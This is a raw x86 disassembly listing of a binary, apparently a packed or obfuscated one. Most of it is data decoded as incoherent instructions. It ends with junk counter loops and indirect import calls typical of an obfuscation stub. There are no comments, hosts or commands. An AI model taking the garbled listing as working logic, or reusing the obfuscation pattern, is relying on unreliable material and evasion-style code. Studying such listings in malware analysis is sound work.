  4181aa:	retf   
  4181ab:	inc    edx
  4181ac:	mov    ah,0xbd
  4181ae:	rcl    DWORD PTR [esi+ebx*2],0x3f
  4181b2:	xchg   al,ch
  4181b4:	aad    0x92
  4181b6:	outs   dx,DWORD PTR ds:[esi]
  4181b7:	out    0x47,al
  4181b9:	retf   0xdc4f
  4181bc:	scas   al,BYTE PTR es:[edi]
  4181bd:	cmp    ecx,esp
  4181bf:	xchg   edx,eax
  4181c0:	mov    bh,0x1c
  4181c2:	and    DWORD PTR [ebx-0x1c],edx
  4181c5:	lock aaa 
  4181c7:	add    al,0xa3
  4181c9:	mov    ch,0xa1
  4181cb:	cli    
  4181cc:	outs   dx,DWORD PTR gs:[esi]
  4181ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181cf:	sub    BYTE PTR [esi-0xfb24120],bh
  4181d5:	ja     0x4181e6
  4181d7:	cwde   
  4181d8:	stos   DWORD PTR es:[edi],eax
  4181d9:	test   eax,0x1d48f7d3
  4181de:	hlt    
  4181df:	or     al,0x2f
  4181e1:	mov    eax,0xfba4f393
  4181e6:	test   al,0x7
  4181e8:	in     al,0xb0
  4181ea:	mov    dh,0xc3
  4181ec:	sub    BYTE PTR [esi-0x35ffaa01],bh
  4181f2:	pusha  
  4181f3:	mov    esp,0xf643daa0
  4181f8:	mov    ds:0x47b1f7c2,eax
  4181fd:	lods   al,BYTE PTR ds:[esi]
  4181fe:	les    ebp,FWORD PTR [eax-0x6d1b9f1c]
  418204:	(bad)  
  418205:	imul   ebp,esi,0x7f
  418208:	dec    esi
  418209:	inc    ebp
  41820a:	scas   eax,DWORD PTR es:[edi]
  41820b:	mov    cl,BYTE PTR [eax]
  41820d:	mov    al,ds:0x16833a43
  418212:	adc    BYTE PTR [esp+eax*2],bl
  418215:	jmp    0xb89509af
  41821a:	sub    bh,BYTE PTR [ebx+0x4ef34508]
  418220:	xchg   edi,eax
  418221:	pop    esi
  418222:	or     BYTE PTR [esi+0x39],dl
  418225:	nop
  418226:	fimul  DWORD PTR [eax+ecx*4+0x1927fea]
  41822d:	scas   al,BYTE PTR es:[edi]
  41822e:	imul   ecx,DWORD PTR [esi-0x2840c44d],0xe8e8df55
  418238:	sub    eax,0x83725021
  41823d:	adc    ebx,eax
  41823f:	jae    0x418233
  418241:	xchg   edi,eax
  418242:	push   0x2a3bf02c
  418247:	pop    es
  418248:	pop    ss
  418249:	fcomp  QWORD PTR [eax-0x5fa05eb]
  41824f:	cmc    
  418250:	(bad)
  418253:	push   ebp
  418254:	es push ss
  418256:	and    esi,esp
  418258:	add    esp,ebx
  41825a:	in     al,0x18
  41825c:	xchg   edx,eax
  41825d:	mov    DWORD PTR fs:[esi+ecx*4],esi
  418261:	and    DWORD PTR [ebx],eax
  418263:	pushf  
  418264:	push   0xffffffa4
  418266:	and    BYTE PTR [esp+eax*1-0x39],dh
  41826a:	dec    edi
  41826b:	scas   eax,DWORD PTR es:[edi]
  41826c:	stc    
  41826d:	out    0x4,eax
  41826f:	lock repz inc ebx
  418272:	xchg   ecx,edx
  418274:	mov    BYTE PTR [esi+0x4a],ah
  418277:	js     0x418219
  418279:	xchg   ecx,eax
  41827a:	mov    bl,0x81
  41827c:	sbb    al,0x73
  41827e:	jbe    0x418210
  418280:	push   edi
  418281:	call   DWORD PTR [esi]
  418283:	fidiv  DWORD PTR ds:0x5947fb8
  418289:	pop    edi
  41828a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41828b:	iret   
  41828c:	sub    al,0xfe
  41828e:	(bad)  
  41828f:	fnsetpm(287 only) 
  418291:	mov    edx,0x382e0bf4
  418296:	cmp    ebp,DWORD PTR [eax]
  418298:	outs   dx,DWORD PTR ds:[esi]
  418299:	popa   
  41829a:	test   eax,0x80e5266e
  41829f:	xchg   esi,eax
  4182a0:	mov    ch,0xe6
  4182a2:	pop    ecx
  4182a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182a4:	push   ds
  4182a5:	into   
  4182a6:	cdq    
  4182a7:	outs   dx,BYTE PTR ds:[esi]
  4182a8:	popf   
  4182a9:	mov    cl,0x7e
  4182ab:	test   DWORD PTR [ecx+0x30],ebx
  4182ae:	sbb    edx,ebp
  4182b0:	test   eax,0x20dff82a
  4182b5:	sbb    ebx,DWORD PTR [edx+eax*1]
  4182b8:	into   
  4182b9:	mov    dl,0x35
  4182bb:	stos   BYTE PTR es:[edi],al
  4182bc:	arpl   cx,cx
  4182be:	mov    ecx,DWORD PTR [edi]
  4182c0:	jne    0x418323
  4182c2:	cli    
  4182c3:	adc    al,0x6d
  4182c5:	sbb    ebp,ebp
  4182c7:	nop
  4182c8:	ficom  WORD PTR [ebx-0x58]
  4182cb:	push   edi
  4182cc:	fst    DWORD PTR [ebx+esi*8+0x1]
  4182d0:	mov    eax,0xab6c0e06
  4182d5:	in     al,dx
  4182d6:	jmp    0xcbb02ae5
  4182db:	(bad)  
  4182dc:	jne    0x4182cb
  4182de:	fisubr WORD PTR [ecx-0x9b1294e]
  4182e4:	dec    esi
  4182e5:	pop    esp
  4182e6:	mov    ebx,0xc8261a98
  4182eb:	aad    0x5
  4182ed:	clc    
  4182ee:	adc    BYTE PTR [edi+0x4b],dl
  4182f1:	repnz xor edx,DWORD PTR [edx-0x21]
  4182f5:	or     ebp,esi
  4182f7:	sub    bh,BYTE PTR [edi+0x2ec730b6]
  4182fd:	lods   al,BYTE PTR ds:[esi]
  4182fe:	sbb    eax,ecx
  418300:	fdivr  DWORD PTR ds:0x42a5652e
  418306:	pop    eax
  418307:	add    edi,DWORD PTR [ecx]
  418309:	xchg   esp,eax
  41830a:	loop   0x418346
  41830c:	or     eax,0x2efed6ad
  418311:	fcom   QWORD PTR [esi+0x66]
  418314:	lds    ebp,FWORD PTR es:[eax]
  418317:	imul   ecx,DWORD PTR ds:[edx+0x72fe244],0xfffffff5
  41831f:	in     al,0xc
  418321:	sbb    DWORD PTR [ebx-0x20],ebx
  418324:	adc    BYTE PTR [esi+ebp*2-0x15],bl
  418328:	test   DWORD PTR [eax+eax*4],0x39730e3f
  41832f:	mov    bh,0x47
  418331:	or     ch,ch
  418333:	mov    ah,0x23
  418335:	mov    ds:0x29a42ecb,al
  41833a:	out    0x6c,eax
  41833c:	xor    eax,0x37cbd08f
  418341:	(bad)  
  418342:	push   ecx
  418343:	inc    ecx
  418344:	in     al,0x20
  418346:	(bad)  
  418347:	popa   
  418348:	adc    BYTE PTR [esi+0x55],ah
  41834b:	mov    fs,WORD PTR [eax+ebx*4+0x17]
  41834f:	(bad)  
  418350:	mov    ebp,0x19b876fd
  418355:	mov    ecx,ecx
  418357:	xor    al,0x9f
  418359:	test   al,0xb7
  41835b:	mov    ah,0x93
  41835d:	and    al,0xa5
  41835f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418360:	ret    0x145f
  418363:	imul   esi,DWORD PTR [ebx-0x256e203c],0x1b
  41836a:	or     DWORD PTR [esi+0x484f347],0x1d
  418371:	add    eax,0xc176c835
  418376:	jg     0x418344
  418378:	arpl   WORD PTR [eax-0x5f],dx
  41837b:	xor    eax,0x61f02a9d
  418380:	add    eax,0xdbb1a41f
  418385:	jnp    0x418384
  418387:	jg     0x41835f
  418389:	sbb    BYTE PTR [edx+0x75],dl
  41838c:	in     eax,0x89
  41838e:	jle    0x41836a
  418390:	loopne 0x4183ac
  418392:	or     BYTE PTR [ebp+0x6ab67c],bh
  418398:	mov    edx,0xba7eed04
  41839d:	jp     0x418340
  41839f:	pop    ss
  4183a0:	cmp    DWORD PTR [ecx+eiz*1],ecx
  4183a3:	lods   eax,DWORD PTR ds:[esi]
  4183a4:	pop    edi
  4183a5:	push   edx
  4183a6:	xor    ebx,DWORD PTR [edx+0x4dbe5ae9]
  4183ac:	test   DWORD PTR [ebp+ebp*2-0x7088a2be],eax
  4183b3:	aam    0xe1
  4183b5:	push   edx
  4183b6:	pop    ds
  4183b7:	mov    al,0xa9
  4183b9:	call   0x87e72706
  4183be:	dec    ebx
  4183bf:	fld    DWORD PTR [esi+esi*8]
  4183c2:	jg     0x418384
  4183c4:	push   eax
  4183c5:	int3   
  4183c6:	cmp    BYTE PTR [esi+0x406ad83e],ah
  4183cc:	sbb    eax,0xfcce97e7
  4183d1:	sbb    cl,BYTE PTR [esi+0x7ce97729]
  4183d7:	pop    ss
  4183d8:	cli    
  4183d9:	xchg   esp,eax
  4183da:	int3   
  4183db:	push   0xd3ac582c
  4183e0:	and    BYTE PTR [ebx-0x4965e441],dh
  4183e6:	xchg   al,al
  4183e8:	adc    eax,ebx
  4183ea:	stc    
  4183eb:	and    ch,dl
  4183ed:	bound  ebx,QWORD PTR ds:0x2a28a086
  4183f3:	out    0x60,eax
  4183f5:	les    eax,FWORD PTR [ecx]
  4183f7:	cld    
  4183f8:	idiv   BYTE PTR [ecx-0x80]
  4183fb:	ffreep st(2)
  4183fd:	push   edx
  4183fe:	and    BYTE PTR [edx+0x6],0x54
  418402:	inc    esi
  418403:	pusha  
  418404:	nop
  418405:	aam    0xfc
  418407:	xchg   ecx,eax
  418408:	ds and eax,0xd1a859bb
  41840e:	aas    
  41840f:	mov    ebp,0xd77a1e4a
  418414:	xchg   ebp,eax
  418415:	or     ebx,edi
  418417:	jbe    0x4183e2
  418419:	sbb    bl,0x81
  41841c:	and    eax,0x1bfbb3ae
  418421:	cmp    dh,bh
  418423:	push   esi
  418424:	sbb    ah,BYTE PTR ds:0x9d5ddaf2
  41842a:	sub    eax,0x541a9602
  41842f:	scas   al,BYTE PTR es:[edi]
  418430:	mov    bh,dh
  418432:	cmp    ecx,DWORD PTR [edi+0x1f52b728]
  418438:	daa    
  418439:	and    DWORD PTR [ebp-0x50],esp
  41843c:	pop    edx
  41843d:	xchg   edx,eax
  41843e:	sbb    esi,DWORD PTR [edx+0x51]
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    al,ah
  418445:	test   eax,0xf2a604ca
  41844a:	icebp  
  41844b:	(bad)  
  41844c:	gs loopne 0x41842d
  41844f:	add    DWORD PTR [edi+0x38a5aff],esp
  418455:	cs cmp dh,bl
  418458:	stos   BYTE PTR es:[edi],al
  418459:	jae    0x418444
  41845b:	call   FWORD PTR [edx+0x27]
  41845e:	cmp    ecx,DWORD PTR ds:0x9d1ed8ea
  418464:	sub    al,0x2f
  418466:	sti    
  418467:	gs push 0x1587edf3
  41846d:	in     eax,dx
  41846e:	fldenv [ecx-0x6c]
  418471:	push   ebp
  418472:	xchg   ecx,eax
  418473:	cmc    
  418474:	jo     0x41843e
  418476:	push   ebp
  418477:	loop   0x418417
  418479:	xchg   edi,eax
  41847a:	aaa    
  41847b:	rcl    DWORD PTR [edx],1
  41847d:	dec    ebp
  41847e:	adc    edx,DWORD PTR [edx+0x44]
  418481:	sbb    BYTE PTR [ecx-0x4e],dl
  418484:	adc    edi,0xffffffea
  418487:	jnp    0x4184e5
  418489:	sub    BYTE PTR [esi+0x78],dh
  41848c:	sub    BYTE PTR [edx],al
  41848e:	mov    ds:0xcdc96547,eax
  418493:	add    DWORD PTR [ebp+0x6e],esp
  418496:	xor    cl,cl
  418498:	jb     0x418503
  41849a:	maxps  xmm0,XMMWORD PTR [edx-0x299d8396]
  4184a1:	ret    0x3719
  4184a4:	adc    esp,DWORD PTR [eax]
  4184a6:	mov    ecx,0xbce83a16
  4184ab:	mov    ah,bl
  4184ad:	push   ebp
  4184ae:	outs   dx,BYTE PTR ds:[esi]
  4184af:	pushf  
  4184b0:	sbb    al,0xfd
  4184b2:	push   ebx
  4184b3:	push   esi
  4184b4:	dec    ebx
  4184b5:	adc    BYTE PTR [edi+ebp*8-0x5670e1c5],al
  4184bc:	or     eax,0x4a282de2
  4184c1:	push   edi
  4184c2:	push   eax
  4184c3:	or     eax,0xb35fcab4
  4184c8:	shl    DWORD PTR [edi],1
  4184ca:	int    0x3f
  4184cc:	fcomp  DWORD PTR [ecx-0x9]
  4184cf:	mov    ds:0x50b58aab,al
  4184d4:	sub    dh,BYTE PTR [esi+edx*4]
  4184d7:	xchg   ecx,eax
  4184d8:	add    esi,DWORD PTR [ecx+ebx*2-0x45]
  4184dc:	ja     0x418492
  4184de:	repz int 0xca
  4184e1:	adc    eax,0xac1053af
  4184e6:	and    eax,0x58ccf616
  4184eb:	jo     0x4184cf
  4184ed:	mul    BYTE PTR [edi]
  4184ef:	sub    edx,0xa3f2dd37
  4184f5:	daa    
  4184f6:	push   eax
  4184f7:	and    edi,DWORD PTR [eax]
  4184f9:	jo     0x4184e7
  4184fb:	xor    ecx,DWORD PTR [eax-0x7fb796d5]
  418501:	or     al,0x15
  418503:	lahf   
  418504:	xlat   BYTE PTR ds:[ebx]
  418505:	pop    ss
  418506:	jmp    0x371dfdba
  41850b:	or     BYTE PTR [ebx-0x313e53e1],ah
  418511:	sbb    eax,0x429156df
  418516:	inc    ecx
  418517:	add    al,0x39
  418519:	add    DWORD PTR [edx+0x3dca089d],ebx
  41851f:	test   DWORD PTR [esi],0x30debc96
  418525:	sub    dh,bl
  418527:	push   ebp
  418528:	xchg   ebp,eax
  418529:	rol    edx,cl
  41852b:	verw   bx
  41852e:	lahf   
  41852f:	jle    0x41852a
  418531:	into   
  418532:	fnstcw WORD PTR [ebp-0x3949aa66]
  418538:	(bad)  
  418539:	mov    al,ds:0xf4d33965
  41853e:	jecxz  0x41857c
  418540:	cmovp  ecx,DWORD PTR [esi-0x50900bcf]
  418547:	sbb    al,0xd0
  418549:	mov    ebx,0x86188b00
  41854e:	adc    eax,ecx
  418550:	or     DWORD PTR ds:0x6903ac3b,esp
  418556:	dec    ecx
  418557:	sbb    BYTE PTR [esi],bh
  418559:	mov    eax,ds:0x49c47d20
  41855e:	fadd   DWORD PTR [eax]
  418560:	and    eax,0xde272022
  418565:	(bad)  
  418566:	out    dx,al
  418567:	lods   al,BYTE PTR ds:[esi]
  418568:	cmp    al,0xf5
  41856a:	jnp    0x418546
  41856c:	mov    DWORD PTR [ebx-0x33b3856e],ecx
  418572:	imul   esp,DWORD PTR ds:0xea458d6e,0xffffffeb
  418579:	push   ebp
  41857a:	adc    al,0x4c
  41857c:	jnp    0x41854c
  41857e:	add    eax,0x25bd2754
  418583:	mov    ebx,eax
  418585:	and    eax,0xe3fc25e3
  41858a:	pop    edx
  41858b:	inc    esi
  41858c:	sbb    edx,DWORD PTR [esi+0x52]
  41858f:	aam    0x1a
  418591:	int3   
  418592:	jmp    0x41855a
  418594:	or     cl,BYTE PTR [edi]
  418596:	pop    ebp
  418597:	out    0x37,eax
  418599:	or     BYTE PTR [edi-0xc328f86],cl
  41859f:	xchg   esi,eax
  4185a0:	or     DWORD PTR [ebx-0x3d],ebp
  4185a3:	retf   0x7aba
  4185a6:	stos   BYTE PTR es:[edi],al
  4185a7:	popa   
  4185a8:	cmp    DWORD PTR [edi+0x43],0xd6087d8f
  4185af:	or     al,0xb6
  4185b1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4185b3:	xor    al,0x5
  4185b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185b6:	sub    al,0xeb
  4185b8:	and    al,0x4f
  4185ba:	mov    ds:0xa5282a0a,al
  4185bf:	mov    esp,0x2c8a9774
  4185c4:	cld    
  4185c5:	loope  0x41854d
  4185c7:	fucomip st,st(4)
  4185c9:	mov    ecx,0x419d3637
  4185ce:	xor    al,0xf4
  4185d0:	test   ebp,ebx
  4185d2:	dec    edx
  4185d3:	jne    0x418568
  4185d5:	clc    
  4185d6:	sbb    eax,0x934e3095
  4185db:	stos   BYTE PTR es:[edi],al
  4185dc:	adc    al,0xa1
  4185de:	dec    ebp
  4185df:	sub    DWORD PTR [esi+esi*1-0x4e],ebx
  4185e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185e4:	sahf   
  4185e5:	xor    al,0x19
  4185e7:	dec    eax
  4185e8:	icebp  
  4185e9:	push   eax
  4185ea:	in     al,0x6b
  4185ec:	jge    0x4185c9
  4185ee:	jl     0x418589
  4185f0:	out    0x39,eax
  4185f2:	mov    bh,0x3c
  4185f4:	add    eax,ebp
  4185f6:	imul   edi,DWORD PTR [esi-0x9],0x77
  4185fa:	mov    cs,WORD PTR [eax]
  4185fc:	ss (bad) 
  4185fe:	in     al,dx
  4185ff:	pop    ebp
  418600:	dec    edi
  418601:	in     al,dx
  418602:	push   ebp
  418603:	xlat   BYTE PTR ds:[ebx]
  418604:	rcr    edx,0x56
  418607:	pop    esp
  418608:	mov    ch,0x55
  41860a:	adc    al,0xec
  41860c:	cli    
  41860d:	and    eax,0xe4c76e13
  418612:	mov    edi,0xfeed31a3
  418617:	pop    edx
  418618:	jl     0x41863b
  41861a:	dec    ebp
  41861b:	stos   DWORD PTR es:[edi],eax
  41861c:	sub    eax,0xf6cc9c8a
  418621:	inc    ebx
  418622:	inc    edx
  418623:	loopne 0x41864d
  418625:	dec    bh
  418627:	pop    eax
  418628:	std    
  418629:	dec    esp
  41862a:	fidivr DWORD PTR [esp+esi*8-0xa420803]
  418631:	jecxz  0x41863b
  418633:	sbb    dl,ah
  418635:	add    esp,esi
  418637:	lds    esp,FWORD PTR [esi]
  418639:	or     BYTE PTR [ebp+0xe646062],dh
  41863f:	or     DWORD PTR [edx-0x7d7606a3],esp
  418645:	mov    ebp,0xe3135e17
  41864a:	scas   al,BYTE PTR es:[edi]
  41864b:	retf   0xe31d
  41864e:	dec    edi
  41864f:	ins    BYTE PTR es:[edi],dx
  418650:	or     DWORD PTR [eax+0x1f],ebp
  418653:	shr    DWORD PTR [ebp-0x31],1
  418656:	and    BYTE PTR [edi+ebp*8+0x789d0914],dh
  41865d:	mov    ah,ch
  41865f:	pop    ds
  418660:	jge    0x4185e3
  418662:	jns    0x418684
  418664:	push   ss
  418665:	sbb    eax,0x8b91755e
  41866a:	cld    
  41866b:	xor    dl,bh
  41866d:	pop    edi
  41866e:	arpl   WORD PTR [ebp+0x727a7e5e],cx
  418674:	cmc    
  418675:	inc    eax
  418676:	jno    0x418682
  418678:	mov    ah,0xeb
  41867a:	jle    0x418625
  41867c:	dec    ecx
  41867d:	and    eax,0xa44f6bb3
  418682:	adc    al,0xeb
  418684:	or     eax,0xd95b3270
  418689:	dec    esi
  41868a:	fstp   QWORD PTR [esi]
  41868c:	push   0xffffffdf
  41868e:	fcom   QWORD PTR [edi-0x6b]
  418691:	sti    
  418692:	mov    al,ds:0x5f1750cb
  418697:	ret    
  418698:	jmp    0x9919:0x869df6e2
  41869f:	mov    eax,0x44b22235
  4186a4:	sub    cl,BYTE PTR [eax+0x661588e7]
  4186aa:	dec    ebp
  4186ab:	xor    DWORD PTR [edx+edi*4-0x27280c2e],0xffffffda
  4186b3:	(bad)  [esi+0x6b]
  4186b6:	cdq    
  4186b7:	pushf  
  4186b8:	pop    esi
  4186b9:	outs   dx,BYTE PTR ds:[esi]
  4186ba:	or     ebx,DWORD PTR [ebx-0x6f]
  4186bd:	add    esi,ecx
  4186bf:	xor    DWORD PTR [ebp+0x5d08c012],ebp
  4186c5:	or     BYTE PTR [eax],0x4e
  4186c8:	or     DWORD PTR [ebx+ecx*8],edi
  4186cb:	dec    ecx
  4186cc:	int    0x53
  4186ce:	cdq    
  4186cf:	icebp  
  4186d0:	adc    DWORD PTR [ebp-0x7d57a43],edx
  4186d6:	jle    0x418680
  4186d8:	test   BYTE PTR ds:0xe6257cf8,ah
  4186de:	cwde   
  4186df:	mov    dh,0x39
  4186e1:	call   0x6bbd:0x93625b35
  4186e8:	cmc    
  4186e9:	outs   dx,BYTE PTR ds:[esi]
  4186ea:	adc    BYTE PTR [eax-0x6c],0x44
  4186ee:	jecxz  0x418728
  4186f0:	dec    BYTE PTR [ecx+0xd]
  4186f3:	(bad)  
  4186f4:	jmp    0x418767
  4186f6:	loopne 0x4186dd
  4186f8:	ret    0x9c93
  4186fb:	(bad)  
  4186fc:	loopne 0x4186b8
  4186fe:	dec    edx
  4186ff:	ja     0x4186f2
  418701:	loopne 0x418743
  418703:	(bad)  
  418704:	fnstcw WORD PTR [esi+0x51]
  418707:	xchg   ecx,eax
  418708:	mov    eax,ds:0x4fb54377
  41870d:	jns    0x4186a5
  41870f:	fdiv   st(6),st
  418711:	inc    esi
  418712:	ins    BYTE PTR es:[edi],dx
  418713:	add    esi,0x2a99aedc
  418719:	and    eax,0x4c02d476
  41871e:	scas   al,BYTE PTR es:[edi]
  41871f:	cs jns 0x418785
  418722:	jnp    0x41872c
  418724:	jae    0x418784
  418726:	lahf   
  418727:	stos   DWORD PTR es:[edi],eax
  418728:	mov    al,BYTE PTR [edi+ecx*2-0x2b3aeb71]
  41872f:	rcl    DWORD PTR [ebx+0x5c],0x50
  418733:	xchg   BYTE PTR [edi+0x24],dh
  418736:	jbe    0x4186bf
  418738:	loop   0x418745
  41873a:	or     BYTE PTR [edx-0x1c],bl
  41873d:	pop    es
  41873e:	pop    es
  41873f:	scas   al,BYTE PTR es:[edi]
  418740:	sbb    DWORD PTR [ecx-0x76],0x678ee3ea
  418747:	push   ss
  418748:	loope  0x41871f
  41874a:	adc    ebp,0xffffff94
  41874d:	jno    0x4186df
  41874f:	adc    bh,BYTE PTR [ebp-0x48]
  418752:	rcr    DWORD PTR [esi],1
  418754:	inc    eax
  418755:	inc    ebx
  418756:	jmp    0x191c:0x125243d8
  41875d:	mov    ecx,0xf89a85ed
  418762:	adc    BYTE PTR [ebx+0x76],ah
  418765:	clc    
  418766:	sbb    eax,0x7515eb14
  41876b:	pusha  
  41876c:	or     al,0x90
  41876e:	jg     0x418724
  418770:	or     BYTE PTR [ebx+esi*8],ch
  418773:	push   esi
  418774:	sbb    bl,BYTE PTR [ecx]
  418776:	inc    ecx
  418777:	not    ebx
  418779:	pop    edx
  41877a:	sbb    BYTE PTR [ecx],bl
  41877c:	inc    ebx
  41877d:	mov    ch,0x94
  41877f:	jns    0x4187dd
  418781:	dec    esp
  418782:	inc    ebx
  418783:	push   ecx
  418784:	hlt    
  418785:	jnp    0x4187eb
  418787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418788:	cld    
  418789:	stc    
  41878a:	xchg   ecx,eax
  41878b:	ins    DWORD PTR es:[edi],dx
  41878c:	ds daa 
  41878e:	xor    cl,BYTE PTR [edx-0x202490e5]
  418794:	or     DWORD PTR [edx+0x3a9013fb],esi
  41879a:	add    esi,ecx
  41879c:	ret    0x4a3b
  41879f:	fadd   QWORD PTR [esi-0x7a]
  4187a2:	inc    ebx
  4187a3:	iret   
  4187a4:	clc    
  4187a5:	loopne 0x4187ff
  4187a7:	cmc    
  4187a8:	inc    eax
  4187a9:	js     0x4187a5
  4187ab:	mov    al,ds:0x728b7ea1
  4187b0:	sub    eax,0x4b926703
  4187b5:	jp     0x41873a
  4187b7:	in     al,dx
  4187b8:	sub    BYTE PTR [esi+0x5c],al
  4187bb:	mov    BYTE PTR ds:0x10cdd004,al
  4187c1:	fwait
  4187c2:	mov    bl,0x4e
  4187c4:	iret   
  4187c5:	cmp    al,0x1e
  4187c7:	pop    esi
  4187c8:	loopne 0x41875d
  4187ca:	les    eax,FWORD PTR [edi-0x71]
  4187cd:	mov    edi,DWORD PTR [esi*4-0x65db1eb9]
  4187d4:	test   ax,0x76a7
  4187d8:	push   ds
  4187d9:	jbe    0x41875d
  4187db:	les    esp,FWORD PTR [edx-0x63232116]
  4187e1:	xchg   edi,eax
  4187e2:	add    eax,0xe90af058
  4187e7:	std    
  4187e8:	cmp    eax,0x95e01e96
  4187ed:	dec    edx
  4187ee:	das    
  4187ef:	jo     0x41878d
  4187f1:	dec    DWORD PTR [esi-0x3c064c8f]
  4187f7:	jmp    0x4187e5
  4187f9:	popa   
  4187fa:	inc    esi
  4187fb:	and    al,0x95
  4187fd:	dec    eax
  4187fe:	call   0xa933:0x7bf3c6e8
  418805:	and    DWORD PTR [ebp+0x8],0xfcfbbce5
  41880c:	mov    esp,0xda76f509
  418811:	mov    ds:0x6068bfac,al
  418816:	jl     0x418884
  418818:	dec    esi
  418819:	jns    0x4187c3
  41881b:	hlt    
  41881c:	cld    
  41881d:	out    dx,eax
  41881e:	out    dx,eax
  41881f:	in     al,0xf
  418821:	test   DWORD PTR [edi],edx
  418823:	fdiv   st(7),st
  418825:	inc    DWORD PTR [ecx+0x42b0001d]
  41882b:	add    BYTE PTR [edx],ah
  41882d:	xor    eax,DWORD PTR [eax]
  41882f:	add    BYTE PTR [ebx+0x558be84d],cl
  418835:	adc    BYTE PTR [ebx],dl
  418837:	cmp    eax,0x42a014
  41883c:	xor    ecx,eax
  41883e:	add    ecx,esi
  418840:	mov    DWORD PTR [edx],ecx
  418842:	and    DWORD PTR ds:0x42d008,0x0
  41884c:	jmp    0x41885e
  418851:	mov    ecx,DWORD PTR ds:0x42d008
  418857:	inc    ecx
  418858:	mov    DWORD PTR ds:0x42d008,ecx
  41885e:	cmp    DWORD PTR ds:0x42d008,0x1f
  418865:	jae    0x418890
  41886b:	cmp    DWORD PTR ds:0x42d008,0x2c
  418872:	ja     0x418890
  418878:	jmp    0x41888b
  41887d:	push   DWORD PTR [ebp-0x20]
  418880:	push   0x8204
  418885:	call   DWORD PTR ds:0x430037
  41888b:	jmp    0x418851
  418890:	mov    ecx,DWORD PTR [ebp-0x18]
  418893:	xor    edi,edi
  418895:	xor    edi,DWORD PTR ds:0x42a010
  41889b:	or     edi,DWORD PTR ds:0x42a008
  4188a1:	mov    DWORD PTR ds:0x42a010,edi
  4188a7:	xor    ecx,eax
  4188a9:	sub    DWORD PTR ds:0x42a008,edx
  4188af:	add    ecx,esi
  4188b1:	mov    DWORD PTR ds:0x42b010,0x12
  4188bb:	cmp    DWORD PTR ds:0x42b010,0x0
  4188c2:	je     0x41891a
  4188c8:	cmp    DWORD PTR ds:0x42b010,0x7
  4188cf:	jl     0x41891a
  4188d5:	jmp    0x4188ec
  4188da:	push   0x42f000
  4188df:	push   0x1
  4188e1:	push   0x49bf
  4188e6:	call   DWORD PTR ds:0x43003b
  4188ec:	cmp    DWORD PTR ds:0x42b010,0x8
  4188f3:	jne    0x418906
  4188f9:	mov    edi,DWORD PTR ds:0x42b010
  4188ff:	dec    edi
  418900:	mov    DWORD PTR ds:0x42b010,edi
  418906:	xor    edi,edi
  418908:	or     edi,DWORD PTR ds:0x42b010
  41890e:	dec    edi
  41890f:	mov    DWORD PTR ds:0x42b010,edi
  418915:	jmp    0x4188bb
  41891a:	mov    DWORD PTR [ebp-0xc],ecx
  41891d:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  418924:	mov    DWORD PTR [ebp-0x14],0xf89c8580
  41892b:	mov    DWORD PTR [ebp-0x10],0xf89c95b0
  418932:	xor    edi,edi
  418934:	or     edi,DWORD PTR ds:0x42a008
  41893a:	adc    DWORD PTR ds:0x429018,edi
  418940:	mov    ecx,DWORD PTR [ebp-0x14]
  418943:	mov    DWORD PTR [ebp+0x8],ecx
  418946:	add    ecx,edi
  418948:	mov    ecx,DWORD PTR [ebp+0x8]
  41894b:	xor    ecx,eax
  41894d:	adc    DWORD PTR ds:0x429024,edi
  418953:	add    ecx,esi
  418955:	not    ecx
  418957:	mov    ecx,0x242ebcc
  41895c:	mov    DWORD PTR ds:0x42b00c,0x46db
  418966:	mov    edi,0xf641bc3
  41896b:	je     0x41d78a
  418971:	mov    DWORD PTR ds:0x42a00c,0x5fae
  41897b:	mov    edx,DWORD PTR [ebp+0x8]
  41897e:	and    DWORD PTR ds:0x429020,0x0
  418988:	mov    ebx,DWORD PTR ds:0x429020
  41898e:	inc    ebx
  41898f:	mov    DWORD PTR ds:0x429020,ebx
  418995:	cmp    DWORD PTR ds:0x429020,0x18
  41899c:	ja     0x4189bf
  4189a2:	jmp    0x4189b2
  4189a7:	push   0x720f
  4189ac:	call   DWORD PTR ds:0x43003f
  4189b2:	cmp    DWORD PTR ds:0x429020,0x14
  4189b9:	jb     0x418988
  4189bf:	mov    ebx,DWORD PTR [ebp-0x8]
  4189c2:	xor    edx,eax
  4189c4:	xor    ebx,eax
  4189c6:	and    DWORD PTR ds:0x429020,0x42b014
  4189d0:	sub    edx,ebx
  4189d2:	sub    edx,esi
  4189d4:	xor    edx,eax
  4189d6:	sbb    DWORD PTR ds:0x42c018,edi
  4189dc:	mov    DWORD PTR [ebp+0x8],edx
  4189df:	xor    edx,0x13c8
  4189e5:	mov    edx,DWORD PTR [ebp+0x8]
  4189e8:	and    DWORD PTR ds:0x42a008,0x0
  4189f2:	mov    ebx,DWORD PTR ds:0x42a008
  4189f8:	inc    ebx
  4189f9:	mov    DWORD PTR ds:0x42a008,ebx
  4189ff:	cmp    DWORD PTR ds:0x42a008,0x9
  418a06:	jg     0x418a5e
  418a0c:	jmp    0x418a37
  418a11:	push   DWORD PTR [ebp-0xc]
  418a14:	push   DWORD PTR [ebp-0x18]
  418a17:	push   0x8dc5
  418a1c:	push   0x3b62
  418a21:	push   DWORD PTR [ebp-0x24]
  418a24:	push   DWORD PTR [ebp-0x24]
  418a27:	push   0x13d0
  418a2c:	push   0x42f00c
  418a31:	call   DWORD PTR ds:0x430047
  418a37:	cmp    DWORD PTR ds:0x42a008,0x8
  418a3e:	jne    0x418a51
  418a44:	mov    ebx,DWORD PTR ds:0x42a008
  418a4a:	inc    ebx
  418a4b:	mov    DWORD PTR ds:0x42a008,ebx
  418a51:	cmp    DWORD PTR ds:0x42a008,0x12
  418a58:	jb     0x4189f2
  418a5e:	mov    ebx,DWORD PTR [ebp-0x58]
  418a61:	sbb    DWORD PTR ds:0x42c008,0x503f
  418a6b:	add    edx,0x5708f1
  418a71:	sub    DWORD PTR ds:0x42c01c,0x42d00c
  418a7b:	imul   edx,ebx
